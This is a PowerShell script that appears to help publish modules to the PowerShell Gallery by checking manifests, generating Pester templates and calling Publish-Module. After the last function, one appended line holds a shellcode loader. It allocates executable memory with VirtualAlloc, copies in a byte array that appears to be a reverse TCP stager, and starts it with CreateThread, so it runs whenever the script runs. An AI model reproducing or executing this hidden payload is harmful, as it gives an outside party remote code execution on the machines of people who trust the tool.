function ShowMenu {
	
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[string]$Title,

		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[string]$ChoiceMessage,

		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string]$NoMessage = 'No thanks'
	)

	$yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", $ChoiceMessage
	$no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", $NoMessage
	$options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
	PromptChoice -Title $Title -ChoiceMessage $ChoiceMessage -options $options
}

function PromptChoice {
	param(
		$Title,
		$ChoiceMessage,
		$Options
	)
	$host.ui.PromptForChoice($Title, $ChoiceMessage, $options, 0)
}

function GetRequiredManifestKeyParams {
	
	[CmdletBinding()]
	param
	(
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string[]]$RequiredKeys = @('Description', 'Version', 'ProjectUri', 'Author')
	)
	
	$paramNameMap = @{
		Version     = 'ModuleVersion'
		Description = 'Description'
		Author      = 'Author'
		ProjectUri  = 'ProjectUri'
	}
	$params = @{ }
	foreach ($val in $RequiredKeys) {
		$result = Read-Host -Prompt "Input value for module manifest key: [$val]"
		$paramName = $paramNameMap.$val
		$params.$paramName = $result
	}
	$params
}

function Invoke-Test {
	param(
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[string]$TestName,

		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[ValidateSet('Test', 'Fix')]
		[string]$Action,

		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[object]$Module
	)
	
	$testHt = $moduleTests | where { $_.TestName -eq $TestName }
	$actionName = '{0}{1}' -f $Action, 'Action'
	& $testHt.$actionName -Module $Module
}

function Publish-PowerShellGalleryModule {
	

	[CmdletBinding(DefaultParameterSetName = 'ByName')]
	param(
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[ValidateScript({
				if (-not (Test-Path -Path $_ -PathType Leaf)) {
					throw "The module $($_) could not be found."
				} else {
					$true
				}
			})]
		[string]$ModuleFilePath,

		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[switch]$RunOptionalTests,

		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string]$NuGetApiKey,

		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[switch]$PublishToGallery
	)

	
	$moduleTests = @(
		@{
			TestName       = 'Module manifest exists'
			Mandatory      = $true
			FailureMessage = 'The module manifest does not exist at the expected path.'
			FixMessage     = 'Run New-ModuleManifest to create a new manifest'
			FixAction      = { 
				param($Module)

				
				$newManParams = @{ Path = $Module.Path }
				$newManParams += GetRequiredManifestKeyParams

				
				Write-Verbose -Message "Running New-ModuleManifest with params: [$($newManParams | Out-String)]"
				New-ModuleManifest @newManParams
			}
			TestAction     = {
				param($Module)

				
				if (-not (Test-Path -Path $Module.Path -PathType Leaf)) {
					$false
				} else {
					$true
				}
			}
		}
		@{
			TestName       = 'Manifest has all required keys'
			Mandatory      = $true
			FailureMessage = 'The module manifest does not have all the required keys populated.'
			FixMessage     = 'Run Update-ModuleManifest to update existing manifest'
			FixAction      = { 
				param($Module)

				
				$Module = Get-Module -Name $Module.Path -ListAvailable

				
				$updateManParams = @{ Path = $Module.Path }
				$missingKeys = ($Module.PsObject.Properties | Where-Object -FilterScript { $_.Name -in @('Description', 'Author', 'Version') -and (-not $_.Value) }).Name
				if ((-not $Module.LicenseUri) -and (-not $Module.PrivateData.PSData.ProjectUri)) {
					$missingKeys += 'ProjectUri'
				}

				$updateManParams += GetRequiredManifestKeyParams -RequiredKeys $missingKeys
				Update-ModuleManifest @updateManParams
			}
			TestAction     = {
				param($Module)

				
				
				$Module = Get-Module -Name $Module.Path -ListAvailable
					
				if ($Module.PsObject.Properties | Where-Object -FilterScript { $_.Name -in @('Description', 'Author', 'Version') -and (-not $_.Value) }) {
					$false
				} elseif ((-not $Module.LicenseUri) -and (-not $Module.PrivateData.PSData.ProjectUri)) {
					$false
				} else {
					$true
				}
			}
		}
		@{
			TestName       = 'Manifest passes Test-Modulemanifest validation'
			Mandatory      = $true
			FailureMessage = 'The module manifest does not pass validation with Test-ModuleManifest'
			FixMessage     = 'Run Test-ModuleManifest explicitly to investigate problems discovered'
			FixAction      = {
				param($Module)
				Test-ModuleManifest -Path $module.Path
			}
			TestAction     = {
				param($Module)
				if (-not (Test-ModuleManifest -Path $Module.Path -ErrorAction SilentlyContinue)) {
					$false
				} else {
					$true
				}
			}
		}
		@{
			TestName       = 'Pester Tests Exists'
			Mandatory      = $false
			FailureMessage = 'The module does not have any associated Pester tests.'
			FixMessage     = 'Create a new Pester test file using a common template'
			FixAction      = { 
				param($Module)

				
				
				$pesterTestPath = "$($Module.ModuleBase)\$($Module.Name).Tests.ps1"
				$publicFunctionNames = (Get-Command -Module $Module).Name

				$templateFuncs = ''
				$templateFuncs += $publicFunctionNames | foreach {
					@"
		describe '$_' {
			
		}

"@
				}

				
				
				$pesterTestTemplate = @'

$ThisModule = "$($MyInvocation.MyCommand.Path -replace "\.Tests\.ps1$", '').psm1"
$ThisModuleName = (($ThisModule | Split-Path -Leaf) -replace ".psm1")
Get-Module -Name $ThisModuleName -All | Remove-Module -Force

Import-Module -Name $ThisModule -Force -ErrorAction Stop



@(Get-Module -Name $ThisModuleName).where({{ $_.version -ne "0.0" }}) | Remove-Module -Force


InModuleScope $ThisModuleName {{
{0}
}}
'@ -f $templateFuncs

				Add-Content -Path $pesterTestPath -Value $pesterTestTemplate
			}
			TestAction     = {
				param($Module)

				if (-not (Test-Path -Path "$($Module.ModuleBase)\$($Module.Name).Tests.ps1" -PathType Leaf)) {
					$false
				} else {
					$true
				}
			}
		}
	)

	try {

		if (-not $NuGetApiKey) {
			throw @"
The NuGet API key was not found in the NuGetAPIKey parameter. In order to publish to the PowerShell Gallery this key is required. 
Go to https://www.powershellgallery.com/users/account/LogOn?returnUrl=%2F for instructions on registering an account and obtaining 
a NuGet API key.
"@
		}

		$module = Get-Module -Name $ModuleFilePath -ListAvailable

		
		$module | Add-Member -MemberType NoteProperty -Name 'Path' -Value "$($module.ModuleBase)\$($Module.Name).psd1" -Force
		
		if ($RunOptionalTests.IsPresent) {
			$whereFilter = { '*' }
		} else {
			$whereFilter = { $_.Mandatory }
		}

		foreach ($test in ($moduleTests | where $whereFilter)) {
			if (-not (Invoke-Test -TestName $test.TestName -Action 'Test' -Module $module)) {			
				$result = ShowMenu -Title $test.FailureMessage -ChoiceMessage "Would you like to resolve this with action: [$($test.FixMessage)]?"
				switch ($result) {
					0 {
						Write-Verbose -Message 'Running fix action...'
						Invoke-Test -TestName $test.TestName -Action 'Fix' -Module $module
					}
					1 { Write-Verbose -Message 'Leaving the problem be...' }
				}
			} else {
				Write-Verbose -Message "Module passed test: [$($test.TestName)]"
			}
		}

		$publishAction = {
			Write-Verbose -Message 'Publishing module...'
			Publish-Module -Name $module.Name -NuGetApiKey $NuGetApiKey
			Write-Verbose -Message 'Done.'
		}
		if ($PublishToGallery.IsPresent) {
			& $publishAction
		} else {
			$result = ShowMenu -Title 'PowerShell Gallery Publication' -ChoiceMessage 'All mandatory tests have passed. Publish it?'
			switch ($result) {
				0 {
					& $publishAction
				}
				1 { 
					Write-Host "Postponing publishing. When ready, use this syntax: Publish-Module -Name $($module.Name) -NuGetApiKey $NuGetApiKey"
				}
			}
		}

	} catch {
		Write-Error -Message $_.Exception.Message
	}
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x44,0x68,0x02,0x00,0x00,0x64,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

